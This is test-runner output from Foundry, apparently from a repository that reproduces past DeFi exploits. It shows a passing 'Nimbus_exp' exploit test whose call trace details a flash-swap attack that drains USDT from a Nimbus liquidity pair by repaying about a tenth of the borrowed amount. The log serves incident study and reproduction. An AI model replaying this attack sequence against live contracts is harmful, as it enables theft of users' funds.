Compiling 26 files with Solc 0.8.25
Compiling 25 files with Solc 0.8.10
Solc 0.8.10 finished in 837.93ms
Solc 0.8.25 finished in 928.03ms
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for src/test/2021-09/Nimbus_exp.sol:ContractTest
[PASS] testExploit() (gas: 151808)
Logs:
  Before exploiting 0
  After exploiting 73601019

Traces:
  [157408] ContractTest::testExploit()
    ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("Before exploiting", 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [3031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1) [staticcall]
    │   └─ ← [Return] 82604959 [8.26e7]
    ├─ [132410] 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1::swap(81778909 [8.177e7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000004dfd8dd)
    │   ├─ [35601] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 81778909 [8.177e7])
    │   │   ├─ emit Transfer(from: 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 81778909 [8.177e7])
    │   │   └─ ← [Stop] 
    │   ├─ [8215] ContractTest::NimbusCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 81778909 [8.177e7], 0, 0x0000000000000000000000000000000000000000000000000000000004dfd8dd)
    │   │   ├─ [6901] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1, 8177890 [8.177e6])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1, value: 8177890 [8.177e6])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1) [staticcall]
    │   │   └─ ← [Return] 9003940 [9.003e6]
    │   ├─ [4817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1) [staticcall]
    │   │   └─ ← [Return] 280901368924817109893 [2.809e20]
    │   ├─ [2413] 0x56E75d45ea19fA96844C51994Ade3CFf65f3E209::nimbusReferralProgram() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000e5ad1a7c9ecfd77c856c211fd5df26a04a72c365
    │   ├─ [9701] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365, 12303 [1.23e4])
    │   │   ├─ emit Transfer(from: 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1, to: 0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365, value: 12303 [1.23e4])
    │   │   └─ ← [Stop] 
    │   ├─ [22281] 0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365::recordFee(0xdAC17F958D2ee523a2206206994597C13D831ec7, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12303 [1.23e4])
    │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365) [staticcall]
    │   │   │   └─ ← [Return] 4195330020 [4.195e9]
    │   │   └─ ← [Stop] 
    │   ├─ emit Sync(reserve0: 8991637 [8.991e6], reserve1: 280901368924817109893 [2.809e20])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 8177890 [8.177e6], amount1In: 0, amount0Out: 81778909 [8.177e7], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 73601019 [7.36e7]
    ├─ [0] console::log("After exploiting", 73601019 [7.36e7]) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 390.40ms (2.33ms CPU time)

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 797.32ms (802.64µs CPU time)

Ran 2 test suites in 800.49ms (1.19s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
